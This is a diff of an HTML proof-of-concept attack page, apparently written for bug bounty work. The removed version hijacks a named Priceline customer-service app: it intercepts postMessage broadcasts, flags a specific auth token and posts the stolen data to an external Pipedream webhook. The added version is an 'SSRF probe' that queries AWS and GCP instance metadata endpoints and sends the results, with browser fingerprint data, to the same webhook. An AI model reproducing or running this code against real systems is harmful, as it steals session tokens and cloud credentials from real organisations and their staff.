@@ -1,63 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Priceline CCP Session Hijack PoC</title>
-    <style>
-        body { font-family: sans-serif; margin: 20px; }
-        #log { background: #f4f4f4; padding: 10px; border: 1px solid #ccc; height: 300px; overflow-y: scroll; white-space: pre-wrap; font-family: monospace;}
-        .warning { color: red; font-weight: bold; }
-    </style>
-</head>
+<head><title>test</title></head>
 <body>
-    <h2>Priceline CCP - Cross-Origin Session Hijack PoC</h2>
-    <p>This page demonstrates how a malicious website can intercept sensitive agent data broadcasted by the in-scope CCP application.</p>
-    
-    <p class="warning">Do NOT use this for malicious purposes. This is for Bug Bounty demonstration only.</p>
+<h1>SSRF probe</h1>
+<script>
+const webhook = 'https://eondm3hfjar18nj.m.pipedream.net';
 
-    <!-- The target vulnerable application (In-Scope) -->
-    <iframe src="https://customerservice-ccp.priceline.com/" width="800" height="400" id="ccpFrame" style="border: 2px solid blue;"></iframe>
+// Confirm JS executes inside the renderer
+fetch(webhook + '/heartbeat?msg=js-running').catch(()=>{});
 
-    <h3>Intercepted Data Log:</h3>
-    <div id="log">Waiting for postMessage broadcast...<br></div>
+// Try AWS metadata (IMDSv2 token-style header)
+fetch('http://169.254.169.254/latest/meta-data/', {
+    headers: {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}
+})
+.then(r => r.text())
+.then(d => fetch(webhook, {method: 'POST', body: 'AWS_META: ' + d}))
+.catch(e => fetch(webhook, {method: 'POST', body: 'AWS_ERR: ' + e.toString()}));
 
-    <script>
-        // Listen for ANY message sent to this window (because CCP uses "*")
-        window.addEventListener("message", function(event) {
-            // Ignore messages from extensions to keep the log clean
-            if (event.source === window) return;
-            
-            const logDiv = document.getElementById("log");
-            const timestamp = new Date().toLocaleTimeString();
-            
-            let dataString = "";
-            try {
-                dataString = JSON.stringify(event.data, null, 2);
-            } catch (e) {
-                dataString = String(event.data);
-            }
+// Try GCP metadata
+fetch('http://metadata.google.internal/computeMetadata/v1/', {
+    headers: {'Metadata-Flavor': 'Google'}
+})
+.then(r => r.text())
+.then(d => fetch(webhook, {method: 'POST', body: 'GCP_META: ' + d}))
+.catch(e => fetch(webhook, {method: 'POST', body: 'GCP_ERR: ' + e.toString()}));
 
-            // Log the intercepted data to the screen
-            const logEntry = `[${timestamp}] Message from ${event.origin}:\n${dataString}\n\n-----------------------\n`;
-            logDiv.innerHTML += logEntry;
-            logDiv.scrollTop = logDiv.scrollHeight;
-
-            // Exfiltrate the stolen data to your Pipedream webhook
-            fetch("https://eondm3hfjar18nj.m.pipedream.net/", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    poc_target: "Priceline CCP",
-                    event_origin: event.origin,
-                    stolen_data: event.data
-                }),
-                mode: "no-cors" // no-cors prevents the browser from throwing a CORS error on the fetch
-            });
-            
-            // Pop an alert if we see the API key (Optional visual proof)
-            if(dataString.includes("4LSrIcBTt2U793l5s8CJiGAKDklNf7Px")) {
-                alert("CRITICAL DATA INTERCEPTED!\nAuth Token Stolen.");
-            }
-        }, false);
-    </script>
+// Renderer environment fingerprint
+fetch(webhook, {method: 'POST', body: 'UA: ' + navigator.userAgent + ' | URL: ' + location.href});
+</script>
 </body>
 </html>
